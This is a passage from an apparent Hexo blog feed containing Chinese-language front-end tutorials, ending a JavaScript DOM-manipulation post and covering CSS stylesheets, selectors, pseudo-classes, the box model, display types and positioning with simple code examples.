id&#x3D;&quot;div1&quot;&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;p1&quot;&gt;这是一个段落。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;p2&quot;&gt;这是另外一个段落。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line">var para &#x3D; document.createElement(&quot;p&quot;);</span><br><span class="line">var node &#x3D; document.createTextNode(&quot;这是一个新的段落。&quot;);</span><br><span class="line">para.appendChild(node);</span><br><span class="line"> </span><br><span class="line">var parent &#x3D; document.getElementById(&quot;div1&quot;);</span><br><span class="line">var child &#x3D; document.getElementById(&quot;p1&quot;);</span><br><span class="line">parent.replaceChild(para, child);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="HTMLCollection-对象"><a href="#HTMLCollection-对象" class="headerlink" title="HTMLCollection 对象"></a>HTMLCollection 对象</h3><h3 id="NodeList对象"><a href="#NodeList对象" class="headerlink" title="NodeList对象"></a>NodeList对象</h3>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS</title>
      <link href="posts/52116.html"/>
      <url>posts/52116.html</url>
      
        <content type="html"><![CDATA[<h2 id="CSS是什么"><a href="#CSS是什么" class="headerlink" title="CSS是什么"></a>CSS是什么</h2><p>叠层样式表 作用：修饰HTML，通俗来说就是内容的呈现方式</p><h2 id="CSS样式规则"><a href="#CSS样式规则" class="headerlink" title="CSS样式规则"></a>CSS样式规则</h2><p>CSS规则由两部分构成：选择器，一条或多条声明</p><h2 id="引入方式-CSS创建"><a href="#引入方式-CSS创建" class="headerlink" title="引入方式(CSS创建)"></a>引入方式(CSS创建)</h2><p>插入样式表的方法有三种：</p><ul><li>外部样式表</li><li>内部样式表</li><li>内联样式</li><li>导入式</li></ul><h3 id="外部样式表-方便用于多个页面的样式"><a href="#外部样式表-方便用于多个页面的样式" class="headerlink" title="外部样式表(方便用于多个页面的样式)"></a>外部样式表(方便用于多个页面的样式)</h3><p>将CSS样式代码单独写在一个.css后缀的外部文件中，通过<link>标签放到HTML的<head>标签之间来引入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;xxx.css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">样式表案例:</span><br><span class="line">hr &#123;color:sienna;&#125;</span><br><span class="line">p &#123;margin-left:20px;&#125;</span><br><span class="line">body &#123;background-image:url(&quot;&#x2F;images&#x2F;back40.gif&quot;);&#125;</span><br></pre></td></tr></table></figure><h3 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h3><p>当单个文档需要特殊样式时，可以使用内部样式表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">hr &#123;color:sienna;&#125;</span><br><span class="line">p &#123;margin-left:20px;&#125;</span><br><span class="line">body &#123;background-image:url(&quot;images&#x2F;back40.gif&quot;);&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br></pre></td></tr></table></figure><h3 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h3><p>直接在某个标签中定义其样式，效率低。请慎用这种方法，例如当样式仅需要在一个元素上应用一次时。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p style&#x3D;&quot;color:sienna;margin-left:20px&quot;&gt;这是一个段落。&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><h3 id="导入式（不常用，了解即可）"><a href="#导入式（不常用，了解即可）" class="headerlink" title="导入式（不常用，了解即可）"></a>导入式（不常用，了解即可）</h3><p>需要放在<code>&lt;head&gt;</code>标签里的<code>&lt;style&gt;</code>标签中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ import url(&quot;文件地址&quot;):</span><br></pre></td></tr></table></figure><h3 id="扩展（多重样式，多重样式的优先级）"><a href="#扩展（多重样式，多重样式的优先级）" class="headerlink" title="扩展（多重样式，多重样式的优先级）"></a>扩展（多重样式，多重样式的优先级）</h3><h4 id="多重样式"><a href="#多重样式" class="headerlink" title="多重样式"></a>多重样式</h4><p>当一种属性在不用样式表中被同样的选择器定义，属性值将会从更具体的样式表中被继承。</p><h4 id="多重样式优秀级"><a href="#多重样式优秀级" class="headerlink" title="多重样式优秀级"></a>多重样式优秀级</h4><p>一般情况下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（内联样式）Inline style &gt; （内部样式）Internal style sheet &gt;（外部样式）External style sheet &gt; 浏览器默认样式</span><br></pre></td></tr></table></figure><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><ul><li>标签选择器</li><li>id选择器</li><li>类选择器</li><li>全选择器</li><li>伪类</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt; </span><br><span class="line"></span><br><span class="line">         p&#123;font-size:20px;&#125;  &lt;!--选择器+&#123;声明&#125;--&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;style&gt; </span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">         &lt;p&gt;这是一个段落&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h3 id="标签选择器"><a href="#标签选择器" class="headerlink" title="标签选择器"></a>标签选择器</h3><p>直接引用标签作为选择器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    div&#123;color:red;&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div&gt;这是一个块&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><h3 id="id选择器"><a href="#id选择器" class="headerlink" title="id选择器"></a>id选择器</h3><p>CSS 中 id 选择器以 “#”+id名称来定义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#p1&#123;text-align:center; color:red;&#125;</span><br><span class="line">id选择器p1，&#123;&#125;写要实现的样式功能</span><br><span class="line"></span><br><span class="line">&lt;p id&#x3D;&quot;p1&quot;&gt;在标签中指定 id为p1以此来实现其定义的样式</span><br><span class="line">例如：</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt; </span><br><span class="line">&lt;title&gt; id选择器的使用 &lt;&#x2F;title&gt; </span><br><span class="line">&lt;style&gt;</span><br><span class="line">#p1</span><br><span class="line">&#123;</span><br><span class="line">text-align:center;</span><br><span class="line">color:red;</span><br><span class="line">&#125; </span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;p1&quot;&gt;Hello World!&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;这个段落不受该样式的影响。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h3 id="类选择器"><a href="#类选择器" class="headerlink" title="类选择器"></a>类选择器</h3><p> “.”+class名称，在要使用该样式的标签中用class命名标签。也可以指定特定的HTML元素使用class，例如 p.center{}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt; </span><br><span class="line">&lt;title&gt;类选择器的使用&lt;&#x2F;title&gt; </span><br><span class="line">&lt;style&gt;</span><br><span class="line">.center&#123;</span><br><span class="line">text-align:center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 class&#x3D;&quot;center&quot;&gt;标题居中&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p class&#x3D;&quot;center&quot;&gt;段落居中。&lt;&#x2F;p&gt; </span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>tips：ID和class的命名不要以数字开头，数字开头的ID在 Mozilla/Firefox 浏览器中不起作用</p><h3 id="群组选择器、全选择器"><a href="#群组选择器、全选择器" class="headerlink" title="群组选择器、全选择器"></a>群组选择器、全选择器</h3><p>使用*号来表示 对整个html中的所有标签都起作用<br>(以下省略head和body部分)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div,p,span&#123;&#125;  &#x2F;* 群组选择器 *&#x2F;</span><br><span class="line">*&#123; text-align:center; &#125; &#x2F;* 通配选择器 *&#x2F;</span><br></pre></td></tr></table></figure><h3 id="伪类选择器"><a href="#伪类选择器" class="headerlink" title="伪类选择器"></a>伪类选择器</h3><p><strong>语法</strong><br>selector:pseudo-class { }</p><p>伪类（pseudo-classes）作用于链接上，可以实现你对链接的不同交互效果。</p><ul><li>link</li><li>visited</li><li>hover</li><li>active</li></ul><h4 id="1-link"><a href="#1-link" class="headerlink" title="1.link"></a>1.link</h4><p>用于未访问的链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:link&#123;</span><br><span class="line">     &lt;!--此处为你没有点击过的链接所展示的效果--&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-visited"><a href="#2-visited" class="headerlink" title="2.visited"></a>2.visited</h4><p>用于以访问链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:visited&#123;</span><br><span class="line">     &lt;!--当你点击链接后，该链接会展示出点击后的效果--&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-hover"><a href="#3-hover" class="headerlink" title="3.hover"></a>3.hover</h4><p>当鼠标移动到链接上时</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:hover&#123;</span><br><span class="line">      &lt;!--当你鼠标悬停在链接上时链接产生的效果--&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-active"><a href="#4-active" class="headerlink" title="4.active"></a>4.active</h4><p>按下链接后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:active&#123;</span><br><span class="line">     &lt;!--按下链接后链接会发生变化--&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="案例："><a href="#案例：" class="headerlink" title="案例："></a>案例：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt; </span><br><span class="line">&lt;title&gt;菜鸟教程(runoob.com)&lt;&#x2F;title&gt; </span><br><span class="line">&lt;style&gt;</span><br><span class="line">a:link &#123;color:#000000;&#125;      &#x2F;* 未访问链接*&#x2F;</span><br><span class="line">a:visited &#123;color:#00FF00;&#125;  &#x2F;* 已访问链接 *&#x2F;</span><br><span class="line">a:hover &#123;color:#FF00FF;&#125;  &#x2F;* 鼠标移动到链接上 *&#x2F;</span><br><span class="line">a:active &#123;color:#0000FF;&#125;  &#x2F;* 鼠标点击时 *&#x2F;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;&lt;b&gt;&lt;a href&#x3D;&quot;&#x2F;css&#x2F;&quot; target&#x3D;&quot;_blank&quot;&gt;这是一个链接&lt;&#x2F;a&gt;&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;&lt;b&gt;注意：&lt;&#x2F;b&gt; 定义的伪类作用于链接&lt;a&gt;标签。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h4 id="after、-before"><a href="#after、-before" class="headerlink" title=":after、:before"></a>:after、:before</h4><ul><li><code>selector:after</code>：在目标之后添加内容（使用content属性）和样式</li><li><code>selector:before</code>：在目标之前添加内容和样式</li></ul><h4 id="表单元素相关"><a href="#表单元素相关" class="headerlink" title="表单元素相关"></a>表单元素相关</h4><ul><li><code>:checked</code>：当元素具有checked属性时被选中</li><li><code>:disabled</code>：当元素具有disabled属性时被选中</li><li><code>:focus</code>：当元素获取到光标时被选中</li></ul><p><strong>伪类和CSS类</strong><br>伪类可以与CSS类配合使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.red:visited &#123;color:#FF0000;&#125;</span><br><span class="line">&lt;a class&#x3D;&quot;red&quot; href&#x3D;&quot;css-syntax.html&quot;&gt;CSS 语法&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>以上4种用法均可用在不同的链接类型上（文字，图片等链接），想要的效果需自行设置（放大缩小，颜色变换的等）<br><strong>注意</strong>： 在CSS定义中，a:hover 必须被置于 a:link 和 a:visited 之后，才是有效的。</p><p><strong>注意</strong>： 在 CSS 定义中，a:active 必须被置于 a:hover 之后，才是有效的。</p><p><strong>注意</strong>：伪类的名称不区分大小写。</p><h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2><ul><li>背景</li><li>边框</li><li>文字</li><li>文本</li><li>链接</li><li>列表(有序ul，无序ol)  </li></ul><h3 id="基本样式"><a href="#基本样式" class="headerlink" title="基本样式"></a>基本样式</h3><p><strong>长度单位</strong><br>像素px、百分比%、相对字体长度单位em</p><p><strong>样式的类型</strong><br>内联样式、内部样式、外部样式</p><p><strong>颜色表示法</strong></p><ul><li>单词表示法：red、blue、green、violet</li><li>十六进制表示法：#000000、#FF0000</li><li>rgb表示法：rgb(255,0,0)</li><li>透明颜色：transparent<br>提取颜色工具FeHelper</li></ul><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><ul><li><p>背景颜色：background-color:red</p></li><li><p>背景图片：background-image:url(“/example.jpg”)</p></li><li><p>背景图片的平铺方式：background-repeat:word，其中word=repeat-x|repeat-y|repeat|no-repeat</p></li><li><p>背景图片的位置：background-position:x y ，其中x=数值|left|right|center，y=数值|top|bottom|center</p></li><li><p>背景图片随滚动条移动的方式：background-attachment:attachment，其中attachment=scroll|fixed</p></li></ul><p>CSS3背景扩展样式：</p><p>background-size：背景图的尺寸、cover覆盖、contain包含</p><p>background-origin：背景图的填充位置、padding-box（默认）、 border-box、content-box</p><p>background-clip：背景图的裁切方式，padding-box、border-box（默认）、content-box</p><h3 id="CSS边框样式"><a href="#CSS边框样式" class="headerlink" title="CSS边框样式"></a>CSS边框样式</h3><ul><li>边框风格（border-style）：solid、dashed、dotted</li><li>边框大小（border-width）</li><li>边框颜色（border-color）</li></ul><p>单独设某一条边：border-left-style: solid;</p><p>绘制三角形：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">width: 0;</span><br><span class="line">height: 0;</span><br><span class="line">border-right: solid red 100px;</span><br><span class="line">border-left: solid transparent 100px;</span><br><span class="line">border-top: solid transparent 100px;</span><br><span class="line">border-bottom: solid transparent 100px;</span><br></pre></td></tr></table></figure><h3 id="文字样式"><a href="#文字样式" class="headerlink" title="文字样式"></a>文字样式</h3><ul><li>font-family：字体类型，中文、西文，衬线体与非衬线体，注意适当添加引号</li><li>font-size：字体大小，数值|xx-small|x-small|small|medium|- large|x-large|xx-large</li><li>font-weight：字体粗细，数值|normal|bold</li><li>font-style：字体样式，normal|italic|oblique，注意区别italic与oblique</li><li>color：字体颜色</li></ul><h3 id="段落样式"><a href="#段落样式" class="headerlink" title="段落样式"></a>段落样式</h3><ul><li>text-decoration：文本装饰，underline|overline|line-through|none</li><li>text-transform：文本大小写，lowercase|uppercase|capitalize</li><li>text-indent：首行缩进，数值表示，单位可以选择px、em等</li><li>text-align：文本对齐方式，left|right|center|justify</li><li>line-height：定义行高，行高=上边距+字体大小+下边距，上边距=下边距，默认行高与字体大小有关，绝对值（带单位）|比例值（不带单位）</li><li>letter-spacing：字间距</li><li>word-spacing：单词间距，针对西文</li><li>折行：word-break: break-all;或者word-wrap: break-word;，注意二者区别</li></ul><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>具体看伪类部分</p><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><h2 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h2><p>所有HTML元素可以看作盒子，在CSS中，”box model”这一术语是用来设计和布局时使用。</p><p>CSS盒模型本质上是一个盒子，封装周围的HTML元素，它包括：边距，边框，填充，和实际内容。</p><p>盒模型允许我们在其它元素和周围元素边框之间的空间放置元素。<br><img src="https://www.runoob.com/images/box-model.gif"></p><ul><li><strong>Margin(外边距)</strong> - 清除边框外的区域，外边距是透明的。</li><li><strong>Border(边框)</strong> - 围绕在内边距和内容外的边框。</li><li><strong>Padding(内边距)</strong> - 清除内容周围的区域，内边距是透明的。</li><li><strong>Content(内容)</strong> - 盒子的内容，显示文本和图像。</li></ul><h3 id="内容Content-即元素"><a href="#内容Content-即元素" class="headerlink" title="内容Content(即元素)"></a>内容Content(即元素)</h3><p>里边是你想要展示的东西</p><h3 id="内边距Padding"><a href="#内边距Padding" class="headerlink" title="内边距Padding"></a>内边距Padding</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;盒子名称&quot;&#123;</span><br><span class="line">     padding:0px;  上下左右</span><br><span class="line">     padding:0px 0px;  对应上下，左右</span><br><span class="line"> padding:0px 0px 0px 0px; 分别对应上，右，下，左</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div&#123;padding: 30px;&#x2F;*上下左右*&#x2F;&#125;</span><br><span class="line">div&#123;padding: 30px 40px;&#x2F;*上下、左右*&#x2F;&#125;</span><br><span class="line">div&#123;padding: 30px 40px 50px 60px;&#x2F;*上、右、下、左*&#x2F;&#125;</span><br></pre></td></tr></table></figure><p>也可以单独设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   padding-left:0px;</span><br><span class="line">   padding-right:0px;</span><br><span class="line">   padding-top:0px;</span><br><span class="line">   padding-bottom:0px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="边框Border"><a href="#边框Border" class="headerlink" title="边框Border"></a>边框Border</h3><p>可以设置边框大小，边框线的类型，线的颜色</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    border:1px solid black;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>这种是同时设置四条边的样式，也可单独设置每条边的，用法同边距一样<br>边框线，分别为点状，实线，双线，虚线</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">     border-style:dotted solid double dashed; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>颜色,可用颜色代号或者英文<br><code>border-color:#666666</code></p><h3 id="外边距Margin"><a href="#外边距Margin" class="headerlink" title="外边距Margin"></a>外边距Margin</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;盒子名称&quot;&#123;</span><br><span class="line">      margin:     &lt;!--用法同上--&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h2><ul><li>块状元素display:block</li><li>内联元素display:inline</li><li>内联块状元素display:inline-block</li><li>隐藏元素display:none</li></ul><h3 id="块状元素"><a href="#块状元素" class="headerlink" title="块状元素"></a>块状元素</h3><p>block:div、p、ul、li、h1……<br>盒子与盒子不能同行显示，但可以设置宽高</p><ul><li>独占一行</li><li>支持所有样式</li><li>宽度默认与父容器相同</li><li>占据矩形区域</li></ul><h3 id="内联元素"><a href="#内联元素" class="headerlink" title="内联元素"></a>内联元素</h3><p>inline：span、a、em、strong、img ……<br>即盒子与盒子可以同行显示，但不能设置宽和高</p><ul><li>紧挨在一起</li><li>不支持某些样式，例如width、height、margin、padding，但img元素支持宽高，因为是替换元素</li><li>宽度由内容决定</li><li>占据区域不一定是矩形</li><li>内联标签之间会有空隙，这是由于换行导致的，一般使用span修饰文本而不是布局，如果非要解决可以将空白的font-size设为0</li></ul><h3 id="内联块状元素"><a href="#内联块状元素" class="headerlink" title="内联块状元素"></a>内联块状元素</h3><p>inline-block：input、select ……</p><ul><li>紧挨在一起，但是支持宽高</li><li>占据矩形区域</li><li>内联块之间会有空隙</li></ul><h3 id="隐藏元素"><a href="#隐藏元素" class="headerlink" title="隐藏元素"></a>隐藏元素</h3><p>这个可以让元素内容不显示<br><code>display:none;   &lt;!--隐藏元素--&gt;</code></p><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><ul><li>Position（定位）</li><li>Overflow</li><li>Float（浮动）</li></ul><h3 id="Position"><a href="#Position" class="headerlink" title="Position"></a>Position</h3><p>position属性指定了元素的定位类型<br>属性值为：</p><ul><li>static</li><li>relative</li><li>fixed</li><li>absolute</li><li>sticky</li></ul><h4 id="static-默认定位"><a href="#static-默认定位" class="headerlink" title="static 默认定位"></a>static 默认定位</h4><p>默认类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">div.static &#123;</span><br><span class="line">    position: static;</span><br><span class="line">    border: 3px solid #73AD21;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="relative-相对定位"><a href="#relative-相对定位" class="headerlink" title="relative 相对定位"></a>relative 相对定位</h4><p>相对定位，相对正常位置的显示方式，对其进行相对的位移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">h2.pos_left</span><br><span class="line">&#123;</span><br><span class="line">    position:relative;</span><br><span class="line">    left:-20px;</span><br><span class="line">&#125;</span><br><span class="line">h2.pos_right</span><br><span class="line">&#123;</span><br><span class="line">    position:relative;</span><br><span class="line">    left:20px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相对定位元素经常被用来作为绝对定位元素的容器块</p><h4 id="fixed-固定定位"><a href="#fixed-固定定位" class="headerlink" title="fixed 固定定位"></a>fixed 固定定位</h4><p>元素的位置相对于浏览器窗口是固定位置。<br>即使窗口是滚动的它也不会移动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p.pos_fixed</span><br><span class="line">&#123;</span><br><span class="line">    position:fixed;</span><br><span class="line">    top:30px;</span><br><span class="line">    right:5px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Fixed定位使元素的位置与文档流无关，因此不占据空间。<br>Fixed定位的元素和其他元素重叠。</p><h4 id="absolute-绝对定位"><a href="#absolute-绝对定位" class="headerlink" title="absolute 绝对定位"></a>absolute 绝对定位</h4><p>绝对定位的元素的位置相对于最近的已定位父元素，如果元素没有已定位的父元素，那么它的位置相对于<code>&lt;html&gt;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">h2</span><br><span class="line">&#123;</span><br><span class="line">    position:absolute;</span><br><span class="line">    left:100px;</span><br><span class="line">    top:150px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>absolute 定位使元素的位置与文档流无关，因此不占据空间。<br>absolute 定位的元素和其他元素重叠。</p><h4 id="sticky-黏性定位，进行黏性操作"><a href="#sticky-黏性定位，进行黏性操作" class="headerlink" title="sticky 黏性定位，进行黏性操作"></a>sticky 黏性定位，进行黏性操作</h4><p>比如在Excel中将首行冻结置顶，无论滚动条如何滚动，始终在第一行</p><ul><li>配合偏移量使用，否则不起作用<br><code>&lt;div style=&quot;padding-bottom:2000px&quot;&gt;</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">div.sticky &#123;</span><br><span class="line">    position: -webkit-sticky; &#x2F;* Safari *&#x2F;</span><br><span class="line">    position: sticky;</span><br><span class="line">    top: 